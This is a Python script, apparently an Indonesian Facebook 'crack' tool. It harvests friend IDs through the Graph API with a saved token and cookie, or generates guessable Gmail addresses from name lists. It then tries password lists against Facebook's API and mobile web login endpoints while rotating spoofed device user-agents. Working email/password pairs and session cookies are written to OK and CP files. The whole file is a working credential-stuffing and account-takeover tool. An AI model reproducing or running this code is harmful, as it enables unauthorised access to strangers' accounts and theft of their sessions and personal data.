import requests,json,os,sys,random,datetime,time,re,platform,subprocess
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as turu
from rich import print as cetak
from rich.panel import Panel as nel
from pwku import *
ini_login,id,id2,uid = [],[],[],[]
pwpluss = []
pwnya = []
loop,zar = 0,[]
ok,cp,oo = 0,0,[]
ses = requests.Session()
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
setcp(cp)
setok(ok)
setcph(cph)
setokh(okh)
setid2(id2)
gr = '\033[1;32;41m'
k = '\033[33m'
w = '\033[1;37m'
g = '\033[1;32m'
r = '\033[1;31m'
b = '\033[1;34m'
p = '\033[1;35m'
c = '\033[1;36m'
y = '\033[1;33m'
reset = '\033[0m'
warna_warni = random.choice([g, r, b, p, y])
tanda = f'{p}[{w}+{p}]{w}'
def cektahun(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']: tahunz = '2009'
        elif fx[:9] in ['100000000']: tahunz = '2009'
        elif fx[:8] in ['10000000']: tahunz = '2009'
        elif fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']: tahunz = '2009'
        elif fx[:7] in ['1000006', '1000007', '1000008', '1000009']: tahunz = '2010'
        elif fx[:6] in ['100001']: tahunz = '2010'
        elif fx[:6] in ['100002', '100003']: tahunz = '2011'
        elif fx[:6] in ['100004']: tahunz = '2012'
        elif fx[:6] in ['100005', '100006']: tahunz = '2013'
        elif fx[:6] in ['100007', '100008']: tahunz = '2014'
        elif fx[:6] in ['100009']: tahunz = '2015'
        elif fx[:5] in ['10001']: tahunz = '2016'
        elif fx[:5] in ['10002']: tahunz = '2017'
        elif fx[:5] in ['10003']: tahunz = '2018'
        elif fx[:5] in ['10004']: tahunz = '2019'
        elif fx[:5] in ['10005']: tahunz = '2020'
        elif fx[:5] in ['10006']: tahunz = '2021'
        elif fx[:5] in ['10007', '10008']: tahunz = '2022'
        elif fx[:5] in ['10009']: tahunz = '2023'
        else: tahunz = ''
    elif len(fx) in [9, 10]:
        tahunz = '2008'
    elif len(fx) == 8:
        tahunz = '2007'
    elif len(fx) == 7:
        tahunz = '2006'
    elif len(fx) == 14 and fx.startswith('61'):
        prefix = int(fx[:4])
        if prefix >= 6157:
            tahunz = '2025'
        else:
            tahunz = '2024'
    else:
        tahunz = ''
    return tahunz
def cetak_panel(teks, lebar):
    garis_atas = (f'{g}~{w}') * lebar
    teks_tengah = teks.center(lebar)
    garis_bawah = (f'{g}~{w}') * lebar

    panel = f"{garis_atas}\n{teks_tengah}\n{garis_bawah}"
    print(panel)
def nge_krek2():
    try:
        print(f"{tanda} Mau dump id berapa contoh: {g}1")
        jumlah_id = int(input(f'{tanda} input:{g} '))
        uids = []
        for i in range(jumlah_id):
            uid = input(f'{tanda} {w}Input id ke-{i+1}:{g} ')
            uids.append(uid)
        tok = open('.tokzar.txt', 'r').read()
        cok = {'cookie': open('.cokzar.txt', 'r').read()}
    except IOError:
        print(f"{tanda} gagal dump mungkin id ga publik.")
        exit()
    except ValueError:
        print(f"{tanda} input angka jangan huruf")
        exit()
    total_id = 0
    try:
        for index, uidz in enumerate(uids, 1):
            print(f"{tanda} {w}Menghitung id ke-{index}: {g}{uidz}")
            count = nge_krek2_helper(uidz, tok, cok, '')
            total_id += count
            print(f"{tanda} {w}Menghitung: {g}{count}")
    except KeyError as e:
        print(f"{tanda} Kesalahan: {e}")
        pass
    print(f"{tanda} {w}Total id: {g}{total_id}")
    zar_atur()
def nge_krek2_helper(uidz, tok, cok, after):
    count = 0
    try:
        params = {
            'access_token': tok,
            'fields': f'friends.after({after})' if after else 'friends'
        }
        po = ses.get(f'https://graph.facebook.com/{uidz}', params=params, cookies=cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id') + '|' + x.get('name'))
            count += 1
        afr = po['friends']['paging']['cursors']['after']
        if afr:
            return count + nge_krek2_helper(uidz, tok, cok, afr)
    except KeyError:
        pass
    return count
def mail():
    dump = set()
    rc = random.choice
    rr = random.randint
    cowok = ['gaming', 'muhammad', 'afrizal', 'ananda', 'alvino', 'andika', 'alif', 'akmal', 'bintang', 'bagus', 'budi', 'cahya', 'candra', 'dedy', 'deri', 'danial', 'darmawan', 'edi', 'eko', 'ferdi', 'fahri', 'fajar', 'fadil', 'fatur', 'firdaus', 'galang', 'gilang', 'gunawan', 'habibi', 'hafid', 'hari', 'hendra', 'hendrik', 'herman', 'husni', 'ikhsan', 'ilham', 'irfan', 'iskandar', 'joko', 'joni', 'junaidi', 'kahar', 'kamal', 'kiki', 'luthfi', 'lukman', 'mahendra', 'maulana', 'muhajir', 'mukhtar', 'naufal', 'nasrul', 'rachman', 'rahmat', 'ramadan', 'ramli', 'reza', 'rizal', 'ridho', 'sandi', 'saputra', 'satria', 'setiawan', 'susanto', 'syahril', 'taufiq', 'teguh', 'toni', 'wahyu', 'widodo', 'yanto', 'yusuf', 'zaki', 'zulfan', 'adrian', 'aldo', 'alfian', 'adib', 'amran', 'arjuna', 'ardian', 'arifin', 'arif', 'arnold', 'bahrul', 'bambang', 'bayu', 'deni', 'dodi', 'dwi', 'edi', 'faisal', 'farhan', 'fathur', 'fikri', 'gerry', 'gibran', 'haris', 'hilmi', 'huda', 'ian', 'imam', 'indra', 'jefri', 'khairul', 'khoir', 'luki', 'marwan', 'miftah', 'muhib', 'mukhlis', 'nanda', 'nanang', 'nazmi', 'panji', 'pandu', 'pratama', 'putra', 'radit', 'rendi', 'rizqi', 'ridwan', 'syarif', 'syukri', 'tama', 'trisna', 'udin', 'usman', 'wawan', 'yogi', 'yudha', 'zahran', 'zulfikar', 'zidan', 'zulham', 'abdullah', 'adil', 'amin', 'ammar', 'azhar', 'azis', 'darma', 'edy', 'febri', 'ferry', 'guntur', 'hadi', 'hafiz', 'harun', 'idris', 'ilmi', 'irsyad', 'juna', 'kamaludin', 'mahmud', 'najib', 'nugraha', 'rachmat', 'rizwan', 'samsul', 'salman', 'satrio', 'sulaiman', 'syaiful', 'tama', 'umar', 'zakaria', 'zulkarnaen', 'adit', 'arwan', 'fajri', 'firman', 'haikal', 'iqbal', 'jaenal', 'kurnia', 'raka', 'ramdhan', 'seno', 'setyo', 'widi', 'yudistira', 'zaenal', 'ammar', 'akhbar', 'adam', 'ahmad', 'ardian', 'arvian', 'bastian', 'bimo', 'bondan', 'cipto', 'cokro', 'darwin', 'dewangga', 'dion', 'donny', 'edwin', 'fajar', 'faisal', 'ferdy', 'gerry', 'hafis', 'hanif', 'hilman', 'harris', 'idham', 'ikhwan', 'iqbal', 'jaenal', 'johan', 'kunto', 'mahesa', 'miko', 'najmi', 'pandji', 'rahmat', 'rama', 'rangga', 'reza', 'rio', 'rivan', 'rusdi', 'sabri', 'seno', 'teguh', 'valentino', 'wawan', 'wildan', 'yusuf', 'yudhistira', 'zaenal', 'zakki', 'zamzam', 'zein']
    cewek = ['adelia', 'afifa', 'alia', 'aline', 'amalia', 'amel', 'annisa', 'arini', 'aurora', 'avani', 'azkia', 'bella', 'brianna', 'calista', 'cindy', 'clarissa', 'danita', 'della', 'devina', 'dhiya', 'ela', 'elin', 'esya', 'felicia', 'fiona', 'gabriella', 'hana', 'hani', 'ika', 'iliana', 'jovita', 'karunia', 'keysha', 'livia', 'luna', 'maharani', 'mery', 'micaela', 'mila', 'nika', 'nira', 'novita', 'pia', 'raisa', 'ramona', 'regina', 'rosa', 'rose', 'sabrina', 'salwa', 'sarina', 'sasha', 'shaura', 'sienna', 'silmi', 'soraya', 'stella', 'talia', 'tasya', 'valeria', 'veronica', 'vanya', 'yasmine', 'zanita', 'amanda', 'anggun', 'ani', 'aulya', 'bunga', 'cantika', 'dahlia', 'delia', 'dita', 'elia', 'fani', 'gisel', 'hera', 'ina', 'intan', 'ira', 'kanya', 'kartika', 'lani', 'layla', 'marissa', 'nadya', 'nana', 'nisa', 'nisrina', 'nur', 'rizka', 'safira', 'selvi', 'silvia', 'sri', 'syifa', 'wulan', 'yasinta', 'yuliana', 'yuni', 'aisyah', 'amelia', 'azalea', 'alya', 'anisa', 'afifah', 'alina', 'alika', 'citra', 'chintya', 'carissa', 'dina', 'dinda', 'dewi', 'dwi', 'ella', 'eva', 'elisa', 'fitri', 'farah', 'fira', 'fatimah', 'gita', 'grace', 'hanna', 'helena', 'hilda', 'indah', 'irma', 'ilona', 'jasmine', 'jihan', 'karina', 'kayla', 'kezia', 'laras', 'linda', 'laila', 'melati', 'mutia', 'nadia', 'nabila', 'nadira', 'niya', 'olivia', 'putri', 'pratiwi', 'rahma', 'ratih', 'rina', 'riska', 'shinta', 'sarah', 'siska', 'salsabila', 'tiara', 'tria', 'umi', 'utami', 'winda', 'yani', 'yasmin', 'zahra', 'zaneta']
    global id
    piliha = f" {g}masukan nama email"
    cetak_panel(piliha, 60)
    nama = input(f'{tanda} input:{g} ')
    
    if ',' in str(nama):
        print(f'{tanda} jangan kosong')
        time.sleep(3)
        exit()
    
    doma = '@gmail.com'
    if '@' not in doma or '.com' not in doma:
        print(f'{tanda} salah woy')
        time.sleep(3)
        exit()

    pilih = (f"{tanda} 1. Nama cowok\n{tanda} 2. Nama cewek")
    cetak_panel(pilih, 60)
    pilihan = input(f"{tanda} input:{g} ")

    if pilihan == '1':
        nama_list = cowok
    elif pilihan == '2':
        nama_list = cewek
    else:
        print(f'{tanda} Pilihan tidak valid')
        time.sleep(3)
        exit()

    format_pilih = (f"{tanda} 1. Format nama (nama, angka, nama+angka)\n"
                    f"{tanda} 2. Format nama (nama, angka)")
    cetak_panel(format_pilih, 60)
    format_bb = input(f"{tanda} input:{g} ")

    if format_bb == '1':
        jumlah = int(input(f'{tanda} mau berapa dump (max:2000):{g} '))
        counter = 0
        while counter < jumlah:
            if format_bb == '1':
                BB = [
                    f'{str(rc(nama_list))}',
                    f'{str(rr(0, 100))}',
                    f'{str(rc(nama_list))}{str(rr(0, 100))}',
                ]
            elif format_bb == '2':
                BB = [
                    f'{str(rc(nama_list))}',
                    f'{str(rr(0, 100))}',
                ]
            
            email = f'{nama}{rc(BB)}{doma}'
            if email not in dump:
                dump.add(email)
                id.append(email + '|' + nama)
                counter += 1
                sys.stdout.write(f"\r{tanda} TOTAL ID  {g}{counter} {w}email..."); sys.stdout.flush()

            time.sleep(0.0003)
        
        print('')
        zar_atur()
def zar_atur():
    pilih = (f'{tanda} 1. CRACK DARI ID {r}TUA{w}\n{tanda} 2. CRACK DARI ID {g}MUDA\n{tanda} 3. CRACK DARI ID {c}ACAK')
    cetak_panel(pilih, 60)
    zarid = input(f'{tanda} input:{g} ')
    if zarid in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif zarid in ['2','02']:
        xbaru=[]
        for baru in sorted(id):
            xbaru.append(baru)
        bkp=len(xbaru)
        bkpp=(bkp-1)
        for miyabi in range(bkp):
            id2.append(xbaru[bkpp])
            bkpp -=1
    elif zarid in ['3','03']:
        for acak in id:
            xnxx = random.randint(0,len(id2))
            id2.insert(xnxx,acak)
    else:
        zahra_animasi2(f'{tanda} KETIK YANG BENER SAYANG')
        exit()
        
    metode_ini()
def metode_ini():
    pilih = (f'{tanda} 1. METODE API{w}\n{tanda} 2. METODE REGULAR')
    cetak_panel(pilih, 60)
    log = input(f'{tanda} input:{g} ')
    if log in ['1']:
        ini_login.append('1')
    elif log in ['2']:
        ini_login.append('2')
    else:
        zahra_animasi2(f'{tanda} KETIK YANG BENER SAYANG')
        metode_ini()
    pw_costom()

def ugen():
    rr = random.randint
    rc = random.choice
    versi_android = f"{rr(4,12)}.0.1"
    android_api_level = str(rr(5,14))
    versi_chrome = f"{rr(50,114)}.0.{rr(1111,4445)}.{rr(45,150)}"
    device_oppo = rc(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
    device_vivo = rc(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
    device_samsung = rc(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
    device_xiaomi = rc(["Mi 11 Lite 5G","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","Mi 12T","MIX 4","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","Mi A3","Mi 6","MI MAX 2","Mi A4"])
    device_infinix = rc(["Infinix Zero 20","Infinix Zero X","Infinix Note 12","Infinix Note 11","Infinix Note 10 Pro","Infinix Hot 12","Infinix Hot 11S","Infinix Hot 11","Infinix Hot 10","Infinix Hot 10i","Infinix Smart 5","Infinix S5 Pro","Infinix S4","Infinix Note 8i","Infinix Note 8","Infinix Hot 9"])
    device_google = rc(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel 5a"])
    device_realme = rc(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185"])
    density = rc([
        "{density=3.0,width=720,height=1280};FB_FW/1;",
        "{density=3.0,width=1080,height=1920};FB_FW/1;",
        "{density=2.75,width=1080,height=2028};FB_FW/1;"
    ])
    opk = rc(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
    oph = rc(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
    carrier = rc(["SomeCarrier","Telkomsel","XL","Indosat","Three"])
    letters = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    build = f"{rc(letters)}{rc(letters)}{rr(10,90)}{rc(letters)}"
    fbbv = rr(881000000, 998999999)
    ua_templates = []
    ua_templates.append(
        f"Mozilla/5.0 (Linux; Android {versi_android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{rr(390,490)}.0.0.30.108;FBBV/{fbbv};FBDM/{density};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/{carrier};FBMF/Samsung;FBBD/Samsung;FBPN/{opk};FBDV/{device_samsung};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
    )
    ua_templates.append(
        f"Mozilla/5.0 (Linux; Android {versi_android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{rr(390,490)}.0.0.30.108;FBBV/{fbbv};FBDM/{density};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/{carrier};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/{opk};FBDV/{device_xiaomi};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
    )
    ua_templates.append(
        f"Dalvik/2.1.0 (Linux; U; Android {android_api_level}; {device_realme} Build/QP1A.{rr(111111,999999)}.{rr(111,999)}) {oph}/{rr(1,9)}"
    )
    ua_templates.append(
        f"Mozilla/5.0 (Linux; Android {versi_android}; {device_infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{rr(390,490)}.0.0.30.108;FBBV/{fbbv};FBDM/{density};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/{carrier};FBMF/Infinix;FBBD/Infinix;FBPN/{opk};FBDV/{device_infinix};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
    )

    ua_templates.append(
        f"Mozilla/5.0 (Linux; Android {versi_android}; {device_google}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{rr(390,490)}.0.0.30.108;FBBV/{fbbv};FBDM/{density};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/{carrier};FBMF/Google;FBBD/Google;FBPN/{opk};FBDV/{device_google};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
    )
    return rc(ua_templates)


def crack(idf,pwx):
	global loop,ok,cp
	ses = requests.Session()
	ua = ugen()
	sys.stdout.write(f'\r{tanda} {loop}/{len(id)} OK-:{g}{ok}{w} CP-:{y}{cp} {g}{idf}{w}'),
	sys.stdout.flush()
	for pw in pwx:
		try:
			if '1' in ini_login:
					params = {
					"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
					"sdk_version": f"{random.randint(1,26)}", 
					"email": idf,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
					headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": f"{random.randint(20000000, 30000000)}",
					"x-fb-sim-hni": f"{random.randint(20000, 40000)}",
					"x-fb-net-hni": f"{random.randint(20000, 40000)}",
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
					po =  ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
					if "User must verify their account" in po.text:
							         cp+=1
							         print('')
							         cetak(nel(f'\r {w}[{c}CHEKPOINT{w}]{w}\n TAHUN BUAT: {y}{cektahun(idf)}{w}\n{w} GMAIL/NO: {y}{idf}{w}\n {w}PASSWORD: {y}{pw}{w}\n {w}USER AGENT: {y}{ua}{w}'))
							         open('/storage/emulated/0/FIRZAH/CP/'+cph,'a').write(idf+'|'+pw+'\n')
							         break
					if "session_key" in po.text:
					           ok+=1
					           print('')
					           cok = ";".join([f"{c['name']}={c['value']}" for c in po.json()['session_cookies']])
					           cetak(nel(f'\r {w}[{c}BERHASIL LOGIN{w}]{w}\n TAHUN BUAT: {w}{g}{cektahun(idf)}{w}\n{w} GMAIL/NO: {g}{idf}{w}\n {w}PASSWORD: {g}{pw}{w}\n {w}COOKIEE: {g}{cok}{w}\n {w}USER AGENT: {g}{ua}{w}'))
					           open('/storage/emulated/0/FIRZAH/OK/'+okh,'a').write(idf+'|'+pw+'|'+cok+'\n')
					           break
				
					else:
					    continue
			else:
					requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
					data = {
                'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
                'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
                'try_number':'0',
                'unrecognized_tries':'0',
                'email':idf,
                'prefill_contact_point':idf,
                'prefill_source':'browser_dropdown',
                'prefill_type':'password',
                'first_prefill_source':'browser_dropdown',
                'first_prefill_type':'contact_point',
                'had_cp_prefilled':'true',
                'had_password_prefilled':'true',
                'is_smart_lock':'false',
                'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
                'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
                'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
                'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
                'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
                '__dyn':'',
                '__csr':'',
                '__req':random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
                '__fmt':'1',
                '__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
                '__user':'0'
            }
					head = {
                'Host': 'x.prod.facebook.com',
                'content-length': f'{len(str(data))}',
                'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': ua,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'sec-ch-ua-full-version-list': '"Android WebView";v="125.0.6422.53", "Chromium";v="125.0.6422.53", "Not.A/Brand";v="24.0.0.0"',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua-platform': '"Linux"',
                'accept': '*/*',
                'origin': 'https://x.prod.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=1, i'
            }
					po =  ses.post("https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data, headers=head, allow_redirects=False)
					if "checkpoint" in ses.cookies.get_dict().keys():
							         cp+=1
							         print('')
							         cetak(nel(f'\r {w}[{c}CHEKPOINT{w}]{w}\n TAHUN BUAT: {y}{cektahun(idf)}{w}\n{w} GMAIL/NO: {y}{idf}{w}\n {w}PASSWORD: {y}{pw}{w}\n {w}USER AGENT: {y}{ua}{w}'))
							         open('/storage/emulated/0/FIRZAH/CP/'+cph,'a').write(idf+'|'+pw+'\n')
							         break
					if "c_user" in ses.cookies.get_dict():
					           ok+=1
					           cok = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					           print('')
					           cetak(nel(f'\r {w}[{c}BERHASIL LOGIN{w}]{w}\n TAHUN BUAT: {w}{g}{cektahun(idf)}{w}\n{w} GMAIL/NO: {g}{idf}{w}\n {w}PASSWORD: {g}{pw}{w}\n {w}COOKIEE: {g}{cok}{w}\n {w}USER AGENT: {g}{ua}{w}'))
					           open('/storage/emulated/0/FIRZAH/OK/'+okh,'a').write(idf+'|'+pw+'|'+cok+'\n')
					           break
				
					else:
					    continue
		except requests.exceptions.ConnectionError:
			turu(31)
	loop+=1
setcrack(crack)
